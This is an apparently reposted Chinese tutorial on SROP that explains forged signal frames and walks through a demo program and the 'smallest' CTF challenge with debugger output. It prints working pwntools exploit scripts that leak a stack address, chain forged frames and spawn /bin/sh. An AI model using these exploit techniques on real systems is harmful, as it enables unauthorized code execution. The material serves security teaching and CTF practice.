> 原文链接: https://www.anquanke.com//post/id/217081 


# SROP攻击原理及例题解析


                                阅读量   
                                **262214**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01f7688a89c505b3a6.jpg)](https://p1.ssl.qhimg.com/t01f7688a89c505b3a6.jpg)



最近阅读了有关SROP的知识，让我对SROP攻击有了一定理解，但总觉得参考材料中给出的例题解释还是不够详细，需要做进一步解释，才好让更多小伙伴理解SROP的具体攻击原理。所以，这篇文章我想向大家详细介绍一下SROP的具体攻击原理，也想同时结合着一道CTF题目，从静态分析到动态跟踪，让大家对SROP有一个实战级的认识，顺带展示频繁交互的动态调试大概是怎样的。首先，先放三条我啃过的背景知识，各位小伙伴可以尝试直接去看，也可先看我的这篇文章对SROP攻击思路的整理，互为补足：

[1. SROP exploit](https://xz.aliyun.com/t/5240)

[2. Sigreturn Oriented Programming (SROP) Attack攻击原理](https://www.freebuf.com/articles/system/articles/network/87447.html)

[3. CTF wiki SROP](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/)

本文建立于上述三篇文章之上，着重梳理两个方面内容：1. SROP背景知识及攻击路线。 2. 结合例题进行实操演示讲解。废话不多说，开讲：

SROP全称为Sigreturn Oriented Programming，其攻击核心为通过伪造一个‘Signal Frame’（以下简称sigFrame）在栈上，同时触发sigreturn系统调用，让内核为我们恢复一个sigFrame所描述的进程，如一个shell、一个wrtie系统调用打印栈地址等，同时通过对sigFrame中rsp和rip的修改，连接多个sigFrame，可通过多次触发sigreturn系统调用，依次恢复多个sigFrame，实现不同的功能，构成SROP攻击。一个sigFrame可理解为一个进程被挂起时，用于保存进程的数据结构，当进程恢复时，通过触发sigreturn来恢复sigFrame，从而恢复一个进程。

SROP漏洞之所以能构成利用，是因为内核挂起某进程时保存的sigFrame和内核恢复某进程还原sigFrame的两个sigFrame，通过对栈指针寄存器sp的控制，不一致，从而还原出一个攻击者想要的进程。

以上为关于SROP的总的介绍，看不懂没关系，下面开始一点点讲解：

首先一个进程P从接收到一个signal到恢复进程P执行，正常情况下会经历如下过程：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0119acc683e38c6a02.png)

1. 进程P接收到发来的signal，内核为其保存上下文为sigFrame，然后被内核挂起。其中sigFrame的顶部8字节（64位机器字长）或4字节（32位机器字长），会被内核设置为rt_sigreturn。rt_sigreturn为sigFrame顶部第一个机器字长区域的名称，其内容为sigreturn系统调用代码的地址，简单说，rt_sigreturn处的内容指向sigreturn系统调用代码。当后续恢复时，栈指针寄存器sp会直接指向sigFrame的顶部。sigFrame结构如下图：

[![](https://p3.ssl.qhimg.com/t0137ad8e1bf1e48c04.png)](https://p3.ssl.qhimg.com/t0137ad8e1bf1e48c04.png)

如上为64位机器字长机器的sigFrame结构，可见其头8字节为rt_sigreturn，指向着sigreturn系统调用代码。

2. 用户态的Signal Handler函数出马，对进程P接收到的signal进行处理，具体怎么处理的我们不用关系，和SROP攻击无关。

3. 当Signal Handler函数处理完signal后，栈指针寄存器sp（64位是rsp，32位是esp）会指向进程P之前保存的sigFrame的栈顶，即rt_sigreturn所在的位置。

4. Signal Handler函数最后一个指令是ret，会将3中栈指针寄存器sp指向的rt_sigreturn中的内容，“pop”给指令寄存器ip（64位是rip，32位是eip，这里用pop是想说此时sp也会加一个机器字长，即指向rt_sigreturn内存地址加一个机器字长的位置，根据上图，64位sp此时应指向uc_flags），此时指令寄存器ip处在sigreturn系统调用代码的位置，触发sigreturn系统调用。这样，sigreturn会根据sigFrame中的内容将进程P恢复原状，让P继续执行。

以上，一切看着都挺好的，但是 2014 年 Vrije Universiteit Amsterdam 的 Erik Bosman 指出，是否可以在进程P的sigFrame被sigreturn系统调用恢复前，做点手脚，让sigreturn恢复一个攻击者伪造的sigFrame，然后出发sigreturn调用，从而恢复出另外一个恶意进程出来。

事实证明，这种想法是可以做到的，我们接着聊。明确两点：

1. sigFrame是完全在用户空间的，进程P可读可写，这就有了攻击者动手脚的空间。

2. 就是SROP漏洞最根本的，内核对进程P挂起时保存的sigFrame以及恢复时还原的sigFrame没有做任何关联，也就给了攻击者通过伪造sigFrame的方式，让sigreturn系统调用恢复出一个恶意进程的机会。

我们首先伪造sigFrame如下：

1. 使其中rax=59（execve的系统调用号，rax寄存器既用来保存返回值，也用来保存系统调用号，这个我们后面细说）。

2. 使其中rdi设置成“/bin/sh”的地址（这个地址可以是攻击者传到栈上的地址，一般是首先泄露栈地址，然后手动加一个offset找到binsh）。

3. 使其中rip设置成syscall的内存地址。

4. 最后将sigFrame栈顶的rt_sigreturn手动设置成sigreturn系统调用代码地址。

此时signal handler执行完毕，栈指针寄存器sp指向这个伪sigFrame栈顶的rt_sigreturn（这个如何让sp指到我们伪造的sigFrame上因题而异，我们看下面例题讲解时再详细讨论），当signal handler执行ret指令时，会触发sigreturn系统调用代码。

当sigreturn系统调用执行完毕后，我们伪造的sigFrame也被sigreturn恢复完成，按照我们上面伪sigFrame内部构造，可知sigreturn会恢复出一个shell进程。

总结一下攻击成功的前提是：

1. 可以通过栈溢出控制栈上的内容（从我体会过的两道示例来看，srop题目的特征是让在栈上溢出很多字节）。

2. 需要知道栈地址，从而知道如传入的“/bin/sh”字符串的地址。

3. 需要知道syscall的地址。

4. 需要知道sigreturn的内存地址。

简单解释一下上面的总结，能控制栈上内容是为了传入我们通过pwntools伪造的sigFrame；知道“/bin/sh”字符串的地址、syscall的地址、sigreturn的内存地址是为了填写到伪sigFrame的相应位置，从而让sigreturn系统调用恢复。

我们从刚刚伪造的恢复成execve系统调用的sigFrame，至让sigreturn触发了一次错误恢复，虽然getshell了，但仅仅是理论上的。做题场景往往还要构造更多sigFrame，首先把栈地址打出来，再触发execve getshell，但是我们通过伪造sigFrame触发的一次syscall后，控制流就不受控了，怎么办呢？

1. 对伪造的sigFrame中栈指针寄存器sp进行控制即可。

2. 将伪造的sigFrame中指令寄存器ip的地址由原来的syscall的地址控制成“syscall；ret” gadget的地址即可。

这样触发伪sigFrame中构造的syscall之后，还会执行一个ret指令，将rsp指向的栈顶处的内容弹到rip中，此时让rsp指向下一个伪造的sigFrame栈顶，这样弹栈时，rip就会是下一个sigFrame rt_sigreturn的内容，从而再来一次sigreturn系统调用，去恢复下一个伪造的sigFrame，实现相应功能。基本流程如下：

[![](https://p1.ssl.qhimg.com/t01cf71de8337a60dcc.png)](https://p1.ssl.qhimg.com/t01cf71de8337a60dcc.png)

上图中注意部署好rt_sigreturn、rsp、rip这三个位置，rsp指向下一个sigFrame的栈顶，sip指向“syscall; ret” gadget 的地址（即图片中的 &amp;`{`syscall; ret`}`）。

这样通过对rsp的控制，实现了sigFrame链接起来，实现连续系统调用，具体系统调用功能，通过控制rax的值来指定（后面详细探讨），形成SROP攻击。

还有件事，就是我们需要找到两个gadget，一个是sigreturn的地址，一个是syscall; ret的地址。

1. sigreturn的地址的话，一般是被动调用的，内核在为进程P保存上下文为sigFrame时，会将sigreturn的地址写在sigFrame的栈顶称为rt_sigreturn。所以系统中会有专用代码调用sigreturn。结论是某些系统可直接在固定地址找到sigreturn代码段，而其他系统尤其开了ASLR后不太容易找到，具体参见开头给出的第二个链接。下面做题的时候，我们再具体分析这个问题。

2. syscall; ret这个gadget的地址，也是一样某在些系统可直接在固定地址找到，而其他系统尤其开了ASLR后不太容易找到。具体做题再看。

还有件事，sigreturn这个地址不一定是必须的，因为：我们将rax设置为15，在触发syscall，效果和sigreturn一模一样，所以找sigreturn gadget地址的问题，转变为对rax寄存器的控制。但因为rax既用来放系统调用号也用来放函数的返回值，所以比如可以通过read函数读入字节的数量这个返回值来控制rax的值，从而指定系统调用号。

OK，到这估计大家还是没有对SROP有实操级的认识，接下来我先对[参考链接1](https://xz.aliyun.com/t/5240)中给出的示例进行对sigreturn进行介绍，然后对[参考链接3](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/)中给出的例题进行调试讲解。（这篇文章还真是不短，汗）

以下代码和题目都引自上面三个参考链接，我自己的内容是在对引用内容特定的代码部分进行讲解补充调试，以帮助读者更好理解SROP，这里首先感谢三个参考链接的作者小伙伴的材料，让我理解了SROP。

首先看参考链接1作者给出的示例C代码：

```
// compiled:

// gcc -g -c -fno-stack-protector srop.c -o srop.o

// ld -e main srop.o -o srop





char global_buf[0x200];





int main()

`{`

    asm(// 读取最多 200 字节

        "mov $0, %%rax\n" // sys_read





        "mov $0, %%rdi\n" // fd

        "lea %0, %%rsi\n" // buf   # 这个%0是c内嵌汇编的占位符，代表第44行的global_buf. 所以传入的字符会直接写到global_buf上

        "mov $0x200, %%rdx\n" // count





        "syscall\n"

        // 读取字节数小于 ucontext_t结构体则直接 exit

        "cmp $0xf8, %%rax\n"

        "jb exit\n"





        // 进行恢复上下文

        "mov $0, %%rdi\n"

        "mov %%rsi, %%rsp\n"  // 执行完read操作，让rsp指到global_buf上.因为在这上面我们要写sigFrame，触发sigreturn来恢复这个sigFrame从而getshell.  sigFrame的构造pwntools已经给我们准备好了，详见exp.py

        "mov $15, %%rax\n" // sys_rt_sigaction





        "syscall\n"

        "jmp exit\n"





        /* split */

        "nop\n"

        "nop\n"





        // syscall 的 symbol，便于查找

        "syscall:\n"

        "syscall\n"

        "jmp exit\n"





        // 退出程序

        "exit:\n"

        "mov $60, %%rax\n"

        "mov $0, %%rsi\n"

        "syscall\n"         

        :

        : "m" (global_buf)

        :

        );

`}`
```

这个程序思路很简单，整体流程就是读取你的输入，如果大小大于一个sigFrame（ucontext_t结构体）的大小，就直接执行sigreturn（rt_sigreturn）系统调用，如果不是，就直接退出。接下来一段一段讲解这个C代码（直接能看懂的同学可以略过下面解释）：

```
// compiled:

// gcc -g -c -fno-stack-protector srop.c -o srop.o

// ld -e main srop.o -o srop

这个是编译语句，按着执行就能得到srop这个可执行程序，它是没有依赖和栈保护的。

char global_buf[0x200];

这个是全局变量，存放read进来的字符串，同时也是我们传入伪造sigFrame的地方。 

    asm(// 读取最多 200 字节

        "mov $0, %%rax\n" // sys_read





        "mov $0, %%rdi\n" // fd

        "lea %0, %%rsi\n" // buf   # 这个%0是c内嵌汇编的占位符，代表第44行的global_buf. 所以传入的字符会直接写到global_buf上

        "mov $0x200, %%rdx\n" // count





        "syscall\n"

        // 读取字节数小于 ucontext_t结构体则直接 exit

        "cmp $0xf8, %%rax\n"

        "jb exit\n"
```

以上为C语言内嵌汇编，主要是AT&amp;T风格，汇编前四行：

第一行”mov $0, %%rax\n”是让rax值为0，因为read函数的系统调用号为0

第二行”mov $0, %%rdi\n”是让rdi为0，代表标准输入流

第三行”lea %0, %%rsi\n”中%0是c内嵌汇编语法，代表后面的global_buf，这样read从标准输入流得到的字节会写在global_buf上

第四行”mov $0x200, %%rdx\n”代表读入字节数量上限

第五行触发syscall，执行read调用，读取标准输入流传入的字节。

第六、七行传入的字节数与sigFrame大小（0xf8）比较，小于就退出，不小于就继续往下执行

```
// 进行恢复上下文

        "mov $0, %%rdi\n"

        "mov %%rsi, %%rsp\n"  // 执行完read操作，让rsp指到global_buf上.因为在这上面我们要写sigFrame，触发sigreturn来恢复这个sigFrame从而getshell.  sigFrame的构造pwntools已经给我们准备好了，详见exp.py

        "mov $15, %%rax\n" // sys_rt_sigaction





        "syscall\n"

        "jmp exit\n"
```

第一行”mov $0, %%rdi\n”指的是置rdi的值为0，应该是sigreturn系统调用需要让rdi为0.

第二行”mov %%rsi, %%rsp\n”这句比较关键，刚刚我们看到rsi已经指到了global_buf上，我们可在在global_buf上写入伪sigFrame，这句指令是让rsp置为rsi的值，即让rsp也指向global_buf头部，也就是伪sigFrame的头部，也就是rt_sigreturn的位置。

第三行”mov $15, %%rax\n”，将rax值设置为15，即sigreturn的系统调用号

第四行”syscall\n”，触发sigreturn系统调用，此时sigreturn相关代码会根据此时rsp的值，去对rsp所指向的位置进行sigFrame恢复，而此时rsp指向的位置正是我们传入的伪sigFrame的位置，即global_buf头部这个位置，从而按照这个伪sigFrame来进行恢复。

第五行跳到exit标识处。

后面的代码比较简单

```
// syscall 的 symbol，便于查找

        "syscall:\n"

        "syscall\n"

        "jmp exit\n"





        // 退出程序

        "exit:\n"

        "mov $60, %%rax\n"

        "mov $0, %%rsi\n"

        "syscall\n"
```

前两行汇编先随便调调syscall，方便找到syscall的地址。然后就是exit流程，不细说了。

编译上面的C代码后，得到srop程序

可以简单测测，随便输几个字母进去，会直接退出，我就不贴这个截图了，大家自测。

接下来我们要传入更多字符（大于0xf8），即传入伪sigFrame，利用代码如下

```
from pwn import *





context(

    log_level='debug',

    arch = "amd64",

    binary = "./srop"

)





# the c program is easy. It just read() a string in. It can receive 0x200 max. and then check if the input string is longer than sizeof(ucontext_t) which is also called sigFrame(the size is 0xf8), if not, the program exits. if so, the program set rsp to global_buf and trigger sigreturn directly. and then the sigFrame is recovered by sigreturn syscall, so we got execve syscall executed ending up with a shell.

io = process()

elf = ELF('./srop')





# create debug file

try:

    f = open('pid', 'w')

    f.write(str(proc.pidof(io)[0]))

    f.close()

except Exception as e:

    print(e)





str_bin_sh_offset = 0x100





frame = SigreturnFrame()

frame.rax = constants.SYS_execve

frame.rdi = elf.symbols['global_buf'] + str_bin_sh_offset  # we already know global_buf addr, and we add an offset to get binsh addr

frame.rsi = 0

frame.rdx = 0

frame.rip = elf.symbols['syscall']





io.send(str(frame).ljust(str_bin_sh_offset, "a") + "/bin/sh\x00")   # ljust means "a" will be on right side to fill the gap, the true string is on the left.



io.interactive()

os.system('rm -f pid')
```

讲一下核心部分

```
str_bin_sh_offset = 0x100
```

首先给个str_bin_sh_offset，构造的sigFrame就在这个offset内部，然后不够0x100这么大的部分，填一堆“a”，最后在这个offset后面加上“/bin/sh”字符串。这个offset，改成0x101、0x150都行，能装下sigFrame，又不大于本题read函数的最大值0x200即可。

```
frame = SigreturnFrame()

frame.rax = constants.SYS_execve

frame.rdi = elf.symbols['global_buf'] + str_bin_sh_offset  # we already know global_buf addr, and we add an offset to get binsh addr

frame.rsi = 0

frame.rdx = 0

frame.rip = elf.symbols['syscall']
```

然后就是构造伪sigFrame，rax设置成execve调用号

rdi设置成binsh的地址，这里global_buf作为全局变量，我们可以在ida中看到它的地址的，如下图：

[![](https://p2.ssl.qhimg.com/t01e365188a95b34d5c.jpg)](https://p2.ssl.qhimg.com/t01e365188a95b34d5c.jpg)

可见，global_buf地址为0x600180，代码中elf.sysbols[‘global_buf’]可以达到一样的功能，得到global_buf的地址。所以，rdi是这样设置成binsh的地址的：先找到global_buf头地址，然后加上str_bin_sh_offset，我们在这个位置写上“/bin/sh\x00”即可。

rsi、rdi作为execve的参数写成0

rip写成syscall的地址，用来触发execve系统调用

io.send(str(frame).ljust(str_bin_sh_offset, “a”) + “/bin/sh\x00”) # ljust means “a” will be on right side to fill the gap, the true string is on the left.

这段代码，是让read函数读入一段字符串，这段字符串构成为str(frame).ljust(str_bin_sh_offset, “a”) + “/bin/sh\x00″，首先是一个sigFrame，然后是一堆“a”，最后是“/bin/sh\x00”字符串，保证“/bin/sh\x00”字符串距离global_buf头部距离为0x100，所以使用ljust，如下为具体传入时的具体字节，及最后的触发execve成功getshell：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a0910a4be2aec063.jpg)

可见确实发送了0x100+0x8个字节，最后0x8即为“/bin/sh\x00”字符串。

好了，从上面例子中我们看到了手动触发sigreturn，让其恢复我们传入的伪sigFrame，来恢复成一个execve shell的过程。接下来，做一道2016年-360春秋杯-srop赛题smallest，这道题难度相较于上面示例难度要更大些，因为涉及到了srop链，我会尽量每个细节点都讲到，请不要嫌我啰嗦。

首先讲smallest丢进ida，看到代码相当简单：

[![](https://p3.ssl.qhimg.com/t017013acc2698845b6.jpg)](https://p3.ssl.qhimg.com/t017013acc2698845b6.jpg)

怪不得叫smallest，一共就6行汇编：

```
xor rax, rax 

mov edx, 400h 

mov rsi, rsp 

mov rdi, rax 

syscall 

retn
```

第一行置rax为0，即置系统调用号为0，为read的系统调用号

第二行设置edx为400，可以读入0x400个字节，百分百溢出了，而且溢出的空间还挺大，可以考虑srop了

第三行让rsi指向rsp所指向的位置，即让rsi指向当前栈顶，read进来的字符串，直接从栈顶开始覆盖内容

第四行让rdi值为0，即read函数的fd参数为0，代表从标准输入流读入

第五行syscall，触发系统调用，开始进行read

第六行retn，“pop”当前栈顶处内容给rip，从这行可见，rsp所指向的位置就是这段代码的返回地址，即我们往栈顶写什么地址，最后ret的时候，就会跳到这个地址。和通常的栈溢出不一样，没有那些padding的段落，直接上来就是覆盖返回地址。

OK，那怎么利用呢？先贴利用代码，再一段段解释

```
from pwn import *

from LibcSearcher import *

small = ELF('./smallest')

if args['REMOTE']:

    sh = remote('127.0.0.1', 7777)

else:

    sh = process('./smallest')

context.arch = 'amd64'

context.log_level = 'debug'

syscall_ret = 0x00000000004000BE

start_addr = 0x00000000004000B0

## set start addr three times





# xor     rax, rax

# mov     edx, 400h

# mov     rsi, rsp

# mov     rdi, rax

# syscall                

# retn





# the code of smallest just set rsi to rsp, so when read triggered(which is also means syscall executed), we just write things on the top of the stack.

# and then the last retn will pop what rsp is pointing to to rip, so what read() write on the top of the stack will be result in rip to execute.

gdb.attach(sh)

payload = p64(start_addr) * 3

sh.send(payload)

# gdb.attach(sh)

raw_input()

## modify the return addr to start_addr+3

## so that skip the xor rax,rax; then the rax=1

## get stack addr

sh.send('\xb3')

raw_input()

stack_addr = u64(sh.recv()[8:16])

raw_input()

log.success('leak stack addr :' + hex(stack_addr))

raw_input()

## make the rsp point to stack_addr

## the frame is read(0,stack_addr,0x400)

sigframe = SigreturnFrame()

sigframe.rax = constants.SYS_read

sigframe.rdi = 0

sigframe.rsi = stack_addr

sigframe.rdx = 0x400

sigframe.rsp = stack_addr

sigframe.rip = syscall_ret

payload = p64(start_addr) + 'a' * 8 + str(sigframe)

sh.send(payload)

raw_input()

## set rax=15 and call sigreturn

sigreturn = p64(syscall_ret) + 'b' * 7

sh.send(sigreturn)

raw_input()

## call execv("/bin/sh",0,0)

sigframe = SigreturnFrame()

sigframe.rax = constants.SYS_execve

sigframe.rdi = stack_addr + 0x120  # "/bin/sh" 's addr

sigframe.rsi = 0x0

sigframe.rdx = 0x0

sigframe.rsp = stack_addr

sigframe.rip = syscall_ret

frame_payload = p64(start_addr) + 'b' * 8 + str(sigframe)

print len(frame_payload)

payload = frame_payload + (0x120 - len(frame_payload)) * '\x00' + '/bin/sh\x00'

sh.send(payload)

raw_input()

sh.send(sigreturn)

sh.interactive()
```

首先说，我在这段利用代码里放了很多raw_input()，就是为了在每次send一段字符串进去后，停住，看看内存当前是什么状态，读者在执行的时候，记得把所有raw_input()，以及最上面的gdb.attach(sh)代码注释掉，才不会卡住。

第一段

```
from pwn import *

from LibcSearcher import *

small = ELF('./smallest')

if args['REMOTE']:

 sh = remote('127.0.0.1', 7777)

else:

 sh = process('./smallest')

context.arch = 'amd64'

context.log_level = 'debug'

syscall_ret = 0x00000000004000BE

start_addr = 0x00000000004000B0
```

例行公事的代码不说了，syscall_ret这个gadget刚好在0x4000BE的位置，start_addr指的是0x4000B0程序的起始位置，每次跳到这里，就会再次执行一遍read操作。具体对应地址，参考下图

[![](https://p3.ssl.qhimg.com/t017013acc2698845b6.jpg)](https://p3.ssl.qhimg.com/t017013acc2698845b6.jpg)

接下来一段代码

```
gdb.attach(sh)

payload = p64(start_addr) * 3

sh.send(payload)

raw_input()
```

一上来就传入3个start_addr地址到栈顶上，原exp上没有过多解释，很容易让人上来摸不到头脑，我详细跟一下这个过程，这里gdb.attach一定要放在send之前，不然看不到三个start_addr出现在栈顶，有可能只能看到两个。

[![](https://p4.ssl.qhimg.com/t01f32b80cd27288167.jpg)](https://p4.ssl.qhimg.com/t01f32b80cd27288167.jpg)

如上图看到，左侧发送了三个start_addr(0x4000b0)过去，此时我们看到rsp的值为0x7ffc1b477860，该地址即为当前栈顶地址，其存储内容为发来的第一个0x4000b0，因为是64位程序，我们将rsp值依次加8看看是不是三个0x4000b0：

[![](https://p1.ssl.qhimg.com/t013e5ae4a4de412ac1.jpg)](https://p1.ssl.qhimg.com/t013e5ae4a4de412ac1.jpg)

可见，栈顶是连续的三个0x4000b0，没问题。我们看看程序执行到哪里了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018cea58b7ae8016cb.jpg)

可见，read的syscall已执行完毕，三个0x4000b0已send到栈顶，接下来要执行ret指令，将rsp当前所指的内容弹给rip，即程序跳到0x4000b0程序开始的位置再执行一次read函数。另外，请注意这个ret执行完后，栈顶已还剩两个0x4000b0。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f1b7b4e8341cf291.jpg)

可见栈上确实还剩两个0x4000b0，然后程序也回到了0x4000b0位置继续执行一次read函数。

然后我们看下一段利用代码

```
## modify the return addr to start_addr+3

## so that skip the xor rax,rax; then the rax=1

## get stack addr

sh.send('\xb3')

raw_input()
```

send了一个字节”\xb3″过去，这是什么意思呢？这段代码利用非常巧妙，让read读一个字节，从而rax作为read的返回值为1，这个1也是write的系统调用号，send的一个字节”\xb3″只覆盖栈顶的第一个0x4000b0的最低位字节，成为0x4000b3（注意是小端序，所以是从最低位字节开始覆盖），这样在本次read结束后，在执行ret指令前，栈顶长这样： 

[![](https://p3.ssl.qhimg.com/t01c3b0d74107ebadb3.jpg)](https://p3.ssl.qhimg.com/t01c3b0d74107ebadb3.jpg)

此时，再执行ret指令，rip返回到的位置就是0x4000b3，从而跳过了0x4000b0地址处 xor rax,rax的指令，避免了rax置零，依旧维持read一个字节后的返回值1。所以，后续如果想让rax为0，就跳回0x4000b0，想让rax为其他值就跳到0x4000b3，避免rax置零。

现在我们执行这个ret指令，来到syscall指令处：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t011987f8254bfd9794.jpg)

此时执行的syscall指令就是对write函数的系统调用了，会将rsp即栈顶处的内容打出0x400个字节来，我们先不执行，看看现在栈上长什么样：

[![](https://p0.ssl.qhimg.com/t018fefeb43a28615b1.jpg)](https://p0.ssl.qhimg.com/t018fefeb43a28615b1.jpg)

然后执行这个syscall指令，看看我们接收到了什么：

[![](https://p2.ssl.qhimg.com/t0105fcdce0d9d11bd0.jpg)](https://p2.ssl.qhimg.com/t0105fcdce0d9d11bd0.jpg)

确实接收到了0x400个字节，并且我们比对一下上面两个图，确实显示write出了栈顶的“第三个”0x4000b0（第一个0x4000b用于再次执行read，第二个覆盖为0x4000b3执行write，第三个也就是这个被write出来了）。第二个8字节也和栈顶的第二个8字节一样，是栈空间的一个地址0x7ffc1b477ef7，这样我们就泄露出了栈空间的一个地址，我们就准备在这里构造伪sigFrame了。

再往下代码：

```
stack_addr = u64(sh.recv()[8:16])

raw_input()

log.success('leak stack addr :' + hex(stack_addr))

raw_input()
```

可以看到，我们取栈顶第二个8字节的内容（本次执行值为0x7ffc1b477ef7）作为stack_addr，在这里构建伪sigFrame。

再往下：

```
## make the rsp point to stack_addr

## the frame is read(0,stack_addr,0x400)

sigframe = SigreturnFrame()

sigframe.rax = constants.SYS_read

sigframe.rdi = 0

sigframe.rsi = stack_addr

sigframe.rdx = 0x400

sigframe.rsp = stack_addr

sigframe.rip = syscall_ret

payload = p64(start_addr) + 'a' * 8 + str(sigframe)

sh.send(payload)

raw_input()
```

想说，此时栈顶还有最后一个0x4000b0，刚刚write函数执行完毕，此时即将执行ret指令，再次执行一遍read函数，接收新的输入，覆盖到栈顶，这个内容是什么呢？就是上面这段代码“p64(start_addr) + ‘a’ * 8 + str(sigframe)”，先是start_addr，然后8个“a”占位，然后是一个伪sigFrame。这段payload打进来后，栈顶就又是0x4000b0了，这次read结束，执行后面ret指令前的样子如下：

[![](https://p0.ssl.qhimg.com/t014d67d26f6d6d0a00.jpg)](https://p0.ssl.qhimg.com/t014d67d26f6d6d0a00.jpg)

可见0x4000b0、“aaaaaaaa”还有伪sigFrame都进来了。此时执行ret指令，会再次回到程序第一行汇编，再再执行read：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01fe54fc82116bdc1a.jpg)

此时又要开始read了，我们传点什么进去呢？请看下面代码

```
## set rax=15 and call sigreturn

sigreturn = p64(syscall_ret) + 'b' * 7

sh.send(sigreturn)

raw_input()
```

传了p64(syscall_ret) + ‘b’ * 7进去，先分分析，p64(syscall_ret) 占领了当前栈顶的“aaaaaaaa”位置，7个’b’占领了栈顶第二个8字节的最低7个字节，一共send了15(0xf)个字节，根据上面的图也知道栈顶第二个8字节最高位的一个字节为\x00，所以此时栈顶结构如下：

[![](https://p2.ssl.qhimg.com/t014831a6d41ebd22a9.jpg)](https://p2.ssl.qhimg.com/t014831a6d41ebd22a9.jpg)

此时再执行当前的ret指令，便会执行syscall_ret这个“syscall;ret”gadget，而恰恰此时rsp会指向我们上次read时传入的伪sigFrame头部，虽然其前7个字节被覆盖成了’bbbbbbb’，不过没有丝毫影响。另外，值得注意的是，因为read函数读了0xf个字节进来，所以此时rax如图为0xf，这个刚好是sigreturn的系统调用号，所以此时执行syscall_ret gadget会触发sigreturn对rsp当前所指的伪sigFrame的恢复流程。如下图：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0165454499ca31fc3f.jpg)

回顾上上个代码，可以知道我们伪造的sigFrame是用来再次恢复成read函数的，区别是rsi指向了泄露的栈地址，rip是’syscall;ret’ gadget，从而再下次传入伪sigFrame就会写到泄露的栈地址位置，这此执行得到的这个栈地址值为0x7ffc1b477ef7。

所以，触发完这个sigreturn syscall之后，会直接恢复成read系统调用，如下图：

[![](https://p0.ssl.qhimg.com/t018b380ab30325b545.jpg)](https://p0.ssl.qhimg.com/t018b380ab30325b545.jpg)

这个read我们传点什么进来呢？请看下面代码

```
## call execv("/bin/sh",0,0)

sigframe = SigreturnFrame()

sigframe.rax = constants.SYS_execve

sigframe.rdi = stack_addr + 0x120  # "/bin/sh" 's addr

sigframe.rsi = 0x0

sigframe.rdx = 0x0

sigframe.rsp = stack_addr

sigframe.rip = syscall_ret

frame_payload = p64(start_addr) + 'b' * 8 + str(sigframe)

print len(frame_payload)

payload = frame_payload + (0x120 - len(frame_payload)) * '\x00' + '/bin/sh\x00'

sh.send(payload)

raw_input()
```

注意到这，栈顶位置已经是0x7ffc1b477ef7了。

我们首先还是将传入了start_addr（0x4000b0）用于再再再次触发read，用于接收我们即将要发送的最后一段payload，然后是8个”b”用于占位，然后就是我们伪造的execve伪sigFrame了，最后就是在相对0x7ffc1b477ef7处0x120偏移处传入’/bin/sh\x00’。结构如下图：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t011743c6624d8fc85d.jpg)

OK，布局完毕，执行这个ret，再次回到0x4000b0，执行read函数。

老复读机了，这个read我们传点什么进来呢？请看下面代码（最后一段了）

```
sh.send(sigreturn) 

sh.interactive()
```

故技重施，将sigreturn的gadget传到新的栈顶：

[![](https://p3.ssl.qhimg.com/t018fc1df661228998a.jpg)](https://p3.ssl.qhimg.com/t018fc1df661228998a.jpg)

